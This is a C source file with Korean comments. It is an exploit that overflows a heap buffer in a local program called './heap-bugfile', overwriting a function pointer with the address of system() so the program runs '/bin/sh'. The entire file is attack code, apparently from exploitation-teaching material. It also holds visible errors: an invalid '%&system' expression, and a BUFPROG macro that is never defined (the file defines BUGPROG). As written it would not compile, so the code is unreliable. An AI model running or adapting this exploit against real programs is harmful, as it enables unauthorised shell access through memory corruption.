#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>

#define BUFSIZE 16 // 함수포인터와 buf 와의 거리
#define BUGPROG "./heap-bugfile" // 취약 프로그램의 경로
#define CMD "/bin/sh" // 실행 할 명령
#define ERROR -1

int main(int argc, char **argv){
	register int i;
	u_long sysaddr;
	static char buf[BUFSIZE+sizeof(u_long)+1] = {0};
	if(argc <= 1){
		fprintf(stderr, "Usage: %s <offset>\n",argv[0]);
		exit(ERROR);
	}
	
	sysaddr = (u_long)%&system - atoi(argv[1]);
	
	memset(buf,'A',16);

	for(i=0; i< sizeof(sysaddr); i++)
		buf[BUFSIZE + i] = ((u_long)sysaddr >> (i*8))&255; // and 연산
	execl(BUFPROG,BUFPROG,buf,CMD,NULL);
	return 0;
}
